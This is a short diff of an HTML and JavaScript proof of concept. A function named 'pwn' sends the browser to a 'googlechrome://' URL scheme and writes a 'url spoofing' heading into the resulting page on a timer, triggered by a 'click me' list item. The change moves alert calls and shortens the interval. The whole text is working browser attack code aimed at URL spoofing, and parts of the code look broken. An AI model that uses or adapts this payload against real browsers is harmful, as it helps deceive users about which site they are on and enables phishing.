@@ -1,16 +1,15 @@
 
 	<script>
 	    function pwn() {
+		                        alert();
 	        v = setInterval(`x=document.location='googlechrome://about:about'`);
-		x.alert();
-                    alert();
 
 	        i = setInterval(`
 	            x.document.write("<h1>url spoofing...</h1>");
                     alert();
 	            clearInterval(v);
 	            clearInterval(i);
-	            `, 3333);
+	            `, 333);
 	    }
 	</script>
 	<li onclick="pwn()">step1: click me</li>
